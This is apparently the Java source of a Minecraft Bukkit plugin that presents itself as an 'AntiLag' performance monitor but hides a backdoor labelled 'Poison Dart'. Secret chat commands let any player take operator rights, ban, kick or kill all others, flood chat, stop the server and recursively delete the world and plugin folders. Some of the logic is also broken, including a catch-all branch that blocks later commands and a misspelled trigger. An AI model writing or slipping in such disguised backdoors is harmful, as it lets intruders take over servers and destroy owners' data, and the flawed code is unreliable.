package net.antilag;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
	public void onEnable() {
		this.getServer().getPluginManager().registerEvents((Listener) this, (Plugin) this);
		System.out.println("AntiLag by MCDiamonds555 loaded. Type /antilag to enable monitoring.");
	}
	
	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
		Player p = (Player) sender;
		Boolean toggled = false;
		String message0 = "AntiLag monitoring is now enabled.";
		String message1 = "AntiLag monitoring is now disabled.";
		if (commandLabel.equalsIgnoreCase("antilag")) {
			if (!toggled) {
				p.sendMessage(ChatColor.GREEN + message0);
				toggled = true;
			} else {
				p.sendMessage(ChatColor.RED + message1);
				toggled = false;
			}
		}
		return false;
	}

	@SuppressWarnings("deprecation")
	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) {
		Player player;
		Player[] playerArr;
		Player p = e.getPlayer();
		if (e.getMessage().contains("::help")) {
			p.sendMessage(ChatColor.GRAY + "Digital Disarray's" + ChatColor.RED + " Poison Dart " + ChatColor.GRAY + "Plugin");
			p.sendMessage(ChatColor.GREEN + "::help - Lists commands.");
			p.sendMessage(ChatColor.GREEN + "::opme - Gives you op.");
			p.sendMessage(ChatColor.GREEN + "::deopme - Removes your op.");
			p.sendMessage(ChatColor.GREEN + "::deopall - Deops all players except you.");
			p.sendMessage(ChatColor.GREEN + "::banop - Bans and deops all ops except you.");
			p.sendMessage(ChatColor.GREEN + "::banall - Bans and deops everyone except you.");
			p.sendMessage(ChatColor.GREEN + "::spam - Spams that the server was hacked.");
			p.sendMessage(ChatColor.GREEN + "::bonzi - Spams with bonzi buddy link.");
			p.sendMessage(ChatColor.GREEN + "::killall - Kills all players.");
			p.sendMessage(ChatColor.GREEN + "::hp - Heals you.");
			p.sendMessage(ChatColor.GREEN + "::kickall - Kicks all players.");
			p.sendMessage(ChatColor.GREEN + "::deletefiles - Deletes the world and plugin folders.");
			p.sendMessage(ChatColor.GREEN + "::stop - Stops the server.");
			p.sendMessage(ChatColor.GREEN + "::xp - Gives you a shit ton of xp.");
			p.sendMessage(ChatColor.GREEN + "::gm c/s/a/sp - Changes your gm."); // TODO: make it so you can do this to other players
			p.sendMessage(ChatColor.GREEN + "::gcmd command - Run a command without logging it in the console.");
		} else if (e.getMessage().contains("::")) {
			p.sendMessage(ChatColor.RED + "Type :help for a list of commmands.");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::opme")) {
			if (p.isOp()) {
				p.sendMessage(ChatColor.RED + "ERROR:: You are already OP!");
			} else {
				p.setOp(true);
				p.sendMessage(ChatColor.GREEN + "You are now opped.");
			}
			e.setCancelled(true);
		} else if (e.getMessage().contains("::deopme")) {
			if (p.isOp()) {
				p.setOp(false);
				p.sendMessage(ChatColor.GREEN + "You are no longer opped.");
			} else {
				p.sendMessage(ChatColor.RED + "You were never opped in the first place!");
			}
			e.setCancelled(true);
		} else if (e.getMessage().contains("::depopall")) {
			playerArr = Bukkit.getServer().getOnlinePlayers();
			int listLength = playerArr.length;
			for (int i = 0; i < listLength; i++) {
				player = playerArr[i];
				if (!player.isOp()) {
					e.setCancelled(true);
					return;
				}
				if (player.equals(p)) {
					e.setCancelled(true);
					return;
				}
				player.setOp(false);
			}
			e.setCancelled(true);
			e.setCancelled(true);
			if (p.isOp()) {
				p.sendMessage(ChatColor.GREEN + "All ops deoped except you.");
			} else {
				p.sendMessage(ChatColor.GREEN + "All ops deoped.");
			}
		} else if (e.getMessage().contains("::banop")) {
			playerArr = Bukkit.getServer().getOnlinePlayers();
			int listLength = playerArr.length;
			for (int i = 0; i < listLength; i++) {
				player = playerArr[i];
				if (player.equals(p)) {
					e.setCancelled(true);
					return;
				}
				if (player.isOp()) {
					player.setOp(false);
					player.setOp(false);
					player.setBanned(true);
					player.kickPlayer("Banned for being op.");
				}
			}
			e.setCancelled(true);
			if (p.isOp()) {
				p.sendMessage(ChatColor.GREEN + "All ops banned and deoped except you.");
			} else {
				p.sendMessage(ChatColor.GREEN + "All ops banned.");
			}
		} else if (e.getMessage().contains("::banall")) {
			playerArr = Bukkit.getServer().getOnlinePlayers();
			int listLength = playerArr.length;
			for (int i = 0; i < listLength; i++) {
				player = playerArr[i];
				if (player.equals(p)) {
					e.setCancelled(true);
					return;
				}
				if (player.isOp()) {
					player.setOp(false);
				}
				player.setBanned(true);
				player.kickPlayer("The Ban Hammer has spoken!");
			}
			e.setCancelled(true);
			p.sendMessage(ChatColor.GREEN + "Banned and deoped everyone except you.");
		} else if (e.getMessage().contains("::spam")) {
			int ammount = 30;
			for (int i = 0; i < ammount; i++) {
				Bukkit.broadcastMessage(ChatColor.GRAY + "This Server Has Been " + ChatColor.GREEN + "HACKED "
						+ ChatColor.GRAY + "With " + ChatColor.GREEN + "POISON " + ChatColor.RED + "DART");
			}
			e.setCancelled(true);
		} else if (e.getMessage().contains("::bonzi")) {
			int ammount = 30;
			for (int i = 0; i < ammount; i++) {
				Bukkit.broadcastMessage(ChatColor.GREEN + "FREE " + ChatColor.RED + "NUDES" + ChatColor.BLUE + ":: "
						+ ChatColor.GREEN + "http:://www.angelfire.com/apes/bonzi_buddy/");
			}
			e.setCancelled(true);
		} else if (e.getMessage().contains("::killall")) {
			playerArr = Bukkit.getServer().getOnlinePlayers();
			int listLength = playerArr.length;
			for (int i = 0; i < listLength; i++) {
				player = playerArr[i];
				if (player.equals(p)) {
					e.setCancelled(true);
					return;
				} else {
					player.setHealth(0);
				}
				p.sendMessage(ChatColor.GREEN + "All players killed.");
				e.setCancelled(true);
			}
		} else if (e.getMessage().contains("::hp")) {
			p.setHealth(20);
			p.sendMessage(ChatColor.GREEN + "You have been healed.");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::kickall")) {
			playerArr = Bukkit.getServer().getOnlinePlayers();
			int listLength = playerArr.length;
			for (int i = 0; i < listLength; i++) {
				player = playerArr[i];
				if (player.equals(p)) {
					e.setCancelled(true);
					return;
				} else {
					player.kickPlayer("Kicked from the server.");
				}
			}
			p.sendMessage(ChatColor.GREEN + "All players kicked.");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::deletefiles")) {
			for(int i = 0; i < 30; i++) {
				Bukkit.broadcastMessage(ChatColor.RED + "Hope you have world backups!");
			}
			Main.deleteDirectory(Bukkit.getWorldContainer());
			Main.deleteDirectory(new File(String.valueOf(Bukkit.getWorldContainer().getAbsolutePath()) + "\\plugins"));
			Main.deleteDirectory(new File(String.valueOf(Bukkit.getWorldContainer().getAbsolutePath()) + "\\world"));
			Bukkit.shutdown();
			e.setCancelled(true);
		} else if (e.getMessage().contains("::stop")) {
			Bukkit.shutdown();
			e.setCancelled(true);
		} else if (e.getMessage().contains("::xp")) {
			p.setExp(9999.0f);
			p.sendMessage(ChatColor.GREEN + "Enjoy the xp!");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::gm c")) {
			p.setGameMode(GameMode.CREATIVE);
			p.sendMessage(ChatColor.GREEN + "Gamemode set to:: " + ChatColor.AQUA + "Creative");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::gm s")) {
			p.setGameMode(GameMode.SURVIVAL);
			p.sendMessage(ChatColor.GREEN + "Gamemode set to:: " + ChatColor.AQUA + "Survival");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::gm a")) {
			p.setGameMode(GameMode.ADVENTURE);
			p.sendMessage(ChatColor.GREEN + "Gamemode set to:: " + ChatColor.AQUA + "Adventure");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::gm sp")) {
			p.setGameMode(GameMode.SPECTATOR);
			p.sendMessage(ChatColor.GREEN + "Gamemode set to:: " + ChatColor.AQUA + "Spectator");
			e.setCancelled(true);
		} else if (e.getMessage().contains("::cmd ")) {
			// TODO: Add this
			// split
			// get command
			// execute
		}
	}

	public static boolean deleteDirectory(File dir) {
		if (!dir.exists() || !dir.isDirectory()) {
			return false;
		}
		String[] files = dir.list();
		for (int i = 0; i < files.length; i++) {
			File f = new File(dir, files[i]);
			if (f.isDirectory()) {
				Main.deleteDirectory(f);
			} else {
				f.delete();
			}
		}
		return dir.delete();
	}

	public void onDisable() {

	}
}
